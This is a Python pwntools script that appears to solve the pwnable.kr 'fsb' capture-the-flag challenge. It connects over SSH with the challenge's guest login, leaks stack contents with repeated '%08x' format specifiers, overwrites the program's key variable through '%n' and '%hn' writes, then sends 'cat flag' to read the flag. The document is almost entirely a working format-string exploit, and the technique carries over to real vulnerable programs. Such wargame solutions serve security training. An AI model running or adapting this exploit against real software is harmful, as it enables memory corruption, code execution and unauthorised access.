from pwn import *
import argh


context.log_level = 'warning'

host = 'pwnable.kr'
user = 'fsb'
port = 2222
password = 'guest'


script = '''
display/s 0x804a100
display/2wx 0x804a060
break *0x8048610
layout regs
continue
'''


def start_gdb(exe_name):
    return gdb.debug([exe_name], script)


def drain(p):
    if p.can_recv():
        p.recv()


def get_stack(p):
    drain(p)
    p.sendline('%08x' * 24)
    res = p.recvline()
    drain(p)
    return [res[i: i+8] for i in xrange(0, len(res), 8)]


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotly')
def main(local=False, runpwn=False):
    p = None
    bin_path = 'fsb'
    e = ELF(bin_path)
    target = 0x804869f
    argv = [bin_path, 'A' * 200]

    if local:
        p = process(argv=argv)
        sleep(0.5)
        gdb.attach(p, script)
    elif runpwn:
        s = ssh(user, host, port, password)
        p = s.process(argv=argv)

    p.recvline()  # enter 1

    a = '%08x' * 12 + '%n'
    l = e.symbols.key + 4 - 4 * 12 - 0x30
    p.sendline('%{}u'.format(l) + a)
    p.recvline()

    p.sendline('%20$n\x00')
    drain(p)


    a = '%08x' * 12 + '%hn'
    l = (e.symbols.key - 4 * 12 - 0x30) & 0xffff
    p.sendline('%{}u'.format(l) + a)
    p.recvline()

    p.sendline('%20$n\x00')
    p.recvuntil('key :')
    p.sendline('0')
    p.recvuntil('Congratz!\n')
    p.sendline('cat flag')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

